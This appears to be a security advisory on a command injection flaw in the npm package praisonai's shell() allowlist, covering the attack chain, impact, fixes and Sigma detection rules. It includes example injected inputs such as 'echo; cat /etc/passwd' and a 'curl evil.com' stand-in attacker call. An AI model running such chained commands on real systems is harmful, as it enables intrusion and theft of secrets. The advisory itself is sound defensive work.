---
title: npm PraisonAI utility-tools.shell() Allowlist Bypass via Shell Chaining (GHSA-5jv7-2mjm-h6qj)
slug: 2026-06-praisonai-shell-bypass
description: The npm package `praisonai` versions 1.5.1 through 1.7.1 contains a command injection vulnerability (GHSA-5jv7-2mjm-h6qj) in its `utility-tools.shell()` helper, which allows attackers to bypass a 'safe read-only' command allowlist by appending arbitrary shell commands with metacharacters after an allowed command, leading to arbitrary code execution with the PraisonAI process privileges.
date: "2026-06-18T15:03:35Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - command-injection
  - npm-package
  - nodejs
  - rce
  - allowlist-bypass
  - ghsa
products:
  - praisonai (1.5.1-1.7.1)
affected_os:
  - Linux
  - Windows
  - macOS
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
references:
  - https://github.com/advisories/GHSA-5jv7-2mjm-h6qj
rules:
  - title: Detects GHSA-5jv7-2mjm-h6qj Exploitation - Nodejs Spawning Shell with Command Chaining (Linux/macOS)
    description: Detects attempts to exploit GHSA-5jv7-2mjm-h6qj where a Node.js process spawns a shell (`sh` or `bash`) with a command line containing both an allowlisted prefix (e.g., `echo`, `ls`) and shell metacharacters (e.g., `;`, `&&`, `|`) followed by another command. This indicates an attempt to bypass the `praisonai` library's safe-command allowlist.
    platform: sigma
    severity: high
    tactics:
      - defense_evasion
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
  - title: Detects GHSA-5jv7-2mjm-h6qj Exploitation - Nodejs Spawning Cmd with Command Chaining (Windows)
    description: Detects attempts to exploit GHSA-5jv7-2mjm-h6qj where a Node.js process spawns `cmd.exe` with a command line containing both an allowlisted prefix (e.g., `echo`, `dir`) and shell metacharacters (e.g., `&`, `&&`, `|`) followed by another command. This indicates an attempt to bypass the `praisonai` library's safe-command allowlist.
    platform: sigma
    severity: high
    tactics:
      - defense_evasion
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

The npm package `praisonai` has been identified with a command injection vulnerability (GHSA-5jv7-2mjm-h6qj) affecting versions 1.5.1 through 1.7.1. The `utility-tools.shell()` helper, located in `dist/tools/utility-tools.js`, is designed to execute "safe read-only commands" by checking only the first whitespace-delimited token against an allowlist (e.g., `ls`, `cat`, `echo`). However, the function then passes the entire input string to Node.js's `child_process.exec()`, which executes it via a system shell. This policy/parser differential allows an attacker to prefix a malicious command with an allowed command and shell metacharacters (e.g., `echo ok; malicious_command`), bypassing the intended allowlist and executing arbitrary commands with the PraisonAI process's privileges. This flaw enables potential file system access, network exfiltration, or denial of service within applications using this vulnerable library.

## Attack Chain

1.  **Initial Access**: An attacker identifies an application or service that integrates the `praisonai` library (versions 1.5.1-1.7.1) and exposes functionality that processes user-controlled input through the vulnerable `utility-tools.shell()` helper.
2.  **Command Crafting**: The attacker crafts a malicious command string. This string starts with a command found in `utility-tools.shell()`'s `safeCommands` allowlist (e.g., `echo`, `ls`) followed by a shell metacharacter (e.g., `;`, `&&`, `|`) and the desired arbitrary command (e.g., `cat /etc/passwd`, `curl evil.com`).
3.  **Vulnerable Function Call**: The crafted malicious command string is submitted as input to the vulnerable application. The application, in turn, passes this string to the `praisonai`'s `utility-tools.shell()` function.
4.  **Allowlist Check Bypass**: The `utility-tools.shell()` function performs its safety check by splitting the input string by whitespace and validating only the *first token* (e.g., `echo`) against its internal `safeCommands` allowlist. Since the first token is allowed, the check passes.
5.  **Shell Execution**: The function proceeds to pass the *entire, unaltered malicious command string* (e.g., `echo; cat /etc/passwd`) to Node.js's `child_process.exec()`.
6.  **Arbitrary Command Execution**: `child_process.exec()` invokes the system's default shell (e.g., `sh -c` on Linux, `cmd.exe /c` on Windows), which interprets the full string. The shell executes the initial allowed command, then, upon encountering the shell metacharacter, proceeds to execute the appended arbitrary command (e.g., `cat /etc/passwd`).
7.  **Impact**: The arbitrary command is executed with the privileges of the PraisonAI application process, potentially leading to sensitive data exposure, file modification, network communication, or system disruption, depending on the command and process context.

## Impact

If an application or service exposes the vulnerable `utility-tools.shell()` helper to untrusted input, the safe-command allowlist becomes ineffective. Attackers can execute arbitrary shell commands with the PraisonAI process privileges. The specific consequences are determined by the embedding application's context and permissions, but can include unauthorized reading of sensitive files and secrets (e.g., credentials, configuration files), modification of files or application state, invocation of local tools, network exfiltration of data if egress is permitted, and denial of service through resource-intensive commands. While no specific victim numbers are available, the broad applicability of Node.js applications means any sector using `praisonai` between versions 1.5.1 and 1.7.1 could be affected.

## Recommendation

*   **Patch Vulnerable Library**: Immediately update `praisonai` to a version higher than 1.7.1 (or explicitly prior to 1.5.1) to address GHSA-5jv7-2mjm-h6qj. The advisory suggests avoiding `exec(command)` for policy-checked strings and instead using `execFile()` or `spawn()` with `shell: false`.
*   **Deploy Detection Rules**: Implement the provided Sigma rules to detect patterns indicative of this exploitation on both Linux/macOS and Windows hosts that run Node.js applications.
*   **Review Code for Vulnerable Usage**: Developers should review their codebase for any instances where `praisonai/dist/tools/utility-tools.js` is imported and its `shell()` function is called with user-controlled input. Refactor such calls to ensure input is properly sanitized or leverage safer alternatives as described in the "Suggested Fix" section of the advisory (GHSA-5jv7-2mjm-h6qj).
*   **Enable Detailed Process Logging**: Ensure `process_creation` logging (e.g., via Sysmon on Windows, Auditd/eBPF on Linux) is enabled and configured to capture full command lines, parent-child process relationships, and image paths to effectively utilize the provided Sigma rules.
